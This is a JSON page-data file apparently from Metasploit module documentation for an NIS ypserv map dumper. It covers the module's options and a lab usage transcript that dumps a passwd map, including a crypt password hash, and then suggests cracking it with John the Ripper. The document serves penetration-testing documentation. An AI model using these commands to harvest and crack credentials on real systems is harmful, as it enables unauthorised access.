{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/auxiliary/gather/nis_ypserv_map","result":{"data":{"moduleMetadataJson":{"id":"29623514-83e9-589c-9ee8-df63a266d1e5","name":"NIS ypserv Map Dumper","fullname":"auxiliary/gather/nis_ypserv_map","description":"This module dumps the specified map from NIS ypserv.\n\n        The following examples are from ypcat -x:\n\n        Use \"ethers\"    for map \"ethers.byname\"\n        Use \"aliases\"   for map \"mail.aliases\"\n        Use \"services\"  for map \"services.byname\"\n        Use \"protocols\" for map \"protocols.bynumber\"\n        Use \"hosts\"     for map \"hosts.byname\"\n        Use \"networks\"  for map \"networks.byaddr\"\n        Use \"group\"     for map \"group.byname\"\n        Use \"passwd\"    for map \"passwd.byname\"\n\n        You may specify a map by one of the nicknames above.","rank":300,"fields":{"detailsSlug":"/modules/details/auxiliary/gather/nis_ypserv_map","documentationSlug":"/modules/documentation/auxiliary/gather/nis_ypserv_map"},"documentation":{"html":"<h2 id=\"introduction\" style=\"position:relative;\"><a href=\"#introduction\" aria-label=\"introduction permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Introduction</h2>\n<p>If you've worked with old Unix systems before, you've probably\nencountered NIS (Network Information Service). The most familiar way of\ndescribing it is a sort of hybrid between DNS and LDAP.</p>\n<p><a href=\"https://docs.oracle.com/cd/E23824_01/html/821-1455/anis1-25461.html\">Oracle</a> says the following about it:</p>\n<blockquote>\n<p>NIS is a distributed naming service. It is a mechanism for identifying and locating network objects and resources. It provides a uniform storage and retrieval method for network-wide information in a transport-protocol and media-independent fashion.</p>\n</blockquote>\n<p>And on its use:</p>\n<blockquote>\n<p>By running NIS, the system administrator can distribute administrative databases, called maps, among a variety of servers (master and slaves). The administrator can update those databases from a centralized location in an automatic and reliable fashion to ensure that all clients share the same naming service information in a consistent manner throughout the network.</p>\n</blockquote>\n<p>The module documented within will allow a tester to dump any map from an\nNIS server (running as <code class=\"language-text\">ypserv</code>). Usually, maps like <code class=\"language-text\">passwd.byname</code>\ncontain things like hashes and user info, which can go a long way during\na pentest.</p>\n<h2 id=\"setup\" style=\"position:relative;\"><a href=\"#setup\" aria-label=\"setup permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Setup</h2>\n<p>Set up NIS as per <a href=\"https://help.ubuntu.com/community/SettingUpNISHowTo\">https://help.ubuntu.com/community/SettingUpNISHowTo</a>.\nIf the link is down, you can find it via the Wayback Machine.</p>\n<h2 id=\"options\" style=\"position:relative;\"><a href=\"#options\" aria-label=\"options permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Options</h2>\n<p><strong>PROTOCOL</strong></p>\n<p>Set this to either TCP or UDP. TCP is the default due to easy discovery.</p>\n<p><strong>DOMAIN</strong></p>\n<p>Set this to your NIS domain.</p>\n<p><strong>MAP</strong></p>\n<p>Set this to the NIS map you want to dump. The default is <code class=\"language-text\">passwd</code>. You\ncan use the nicknames described in the module info instead of the full\nmap names.</p>\n<p><strong>XDRTimeout</strong></p>\n<p>Set this to the timeout in seconds for XDR decoding of the response.</p>\n<h2 id=\"usage\" style=\"position:relative;\"><a href=\"#usage\" aria-label=\"usage permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Usage</h2>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf &gt; use auxiliary/gather/nis_ypserv_map\nmsf auxiliary(gather/nis_ypserv_map) &gt; set rhost 192.168.0.2\nrhost =&gt; 192.168.0.2\nmsf auxiliary(gather/nis_ypserv_map) &gt; set domain gesellschaft\ndomain =&gt; gesellschaft\nmsf auxiliary(gather/nis_ypserv_map) &gt; run\n\n[+] 192.168.0.2:111 - Dumping map passwd.byname on domain gesellschaft:\nlist:*:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nubuntu:$6$LXFAVGTO$yiCXi1KjLynOrapuhJE7tKnvdwknDMKiKM7Z8ZB19ht6CHmsS.CbUTm8q0cy5fFHEqA.Sg4Acl.0UtY.Y0JNE1:1000:1000:Ubuntu:/home/ubuntu:/bin/bash\ngames:*:5:60:games:/usr/games:/usr/sbin/nologin\nnews:*:9:9:news:/var/spool/news:/usr/sbin/nologin\nlp:*:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nsys:*:3:3:sys:/dev:/usr/sbin/nologin\nbackup:*:34:34:backup:/var/backups:/usr/sbin/nologin\nuucp:*:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nsystemd-resolve:*:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false\nman:*:6:12:man:/var/cache/man:/usr/sbin/nologin\nbin:*:2:2:bin:/bin:/usr/sbin/nologin\ngnats:*:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\nsync:*:4:65534:sync:/bin:/bin/sync\nsystemd-network:*:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false\nuuidd:*:108:112::/run/uuidd:/bin/false\ndnsmasq:*:109:65534:dnsmasq,,,:/var/lib/misc:/bin/false\nroot:*:0:0:root:/root:/bin/bash\nsshd:*:110:65534::/var/run/sshd:/usr/sbin/nologin\nsystemd-bus-proxy:*:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false\nirc:*:39:39:ircd:/var/run/ircd:/usr/sbin/nologin\nmessagebus:*:107:111::/var/run/dbus:/bin/false\n_apt:*:105:65534::/nonexistent:/bin/false\nmail:*:8:8:mail:/var/mail:/usr/sbin/nologin\nsyslog:*:104:108::/home/syslog:/bin/false\ndaemon:*:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nsystemd-timesync:*:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false\npollinate:*:111:1::/var/cache/pollinate:/bin/false\nwww-data:*:33:33:www-data:/var/www:/usr/sbin/nologin\nproxy:*:13:13:proxy:/bin:/usr/sbin/nologin\nlxd:*:106:65534::/var/lib/lxd/:/bin/false\n\n[*] Auxiliary module execution completed\nmsf auxiliary(gather/nis_ypserv_map) &gt;</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>After dumping a map, you can find it stored in <code class=\"language-text\">loot</code> later. You should\nbe able to run something like John the Ripper directly on the\n<code class=\"language-text\">passwd.byname</code> map.</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf auxiliary(gather/nis_ypserv_map) &gt; loot\n\nLoot\n====\n\nhost         service  type           name  content     info  path\n----         -------  ----           ----  -------     ----  ----\n192.168.0.2           passwd.byname        text/plain        /home/wvu/.msf4/loot/20180108143013_default_192.168.0.2_passwd.byname_509006.txt\n\nmsf auxiliary(gather/nis_ypserv_map) &gt;</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>"}}},"pageContext":{"id":"29623514-83e9-589c-9ee8-df63a266d1e5"}}}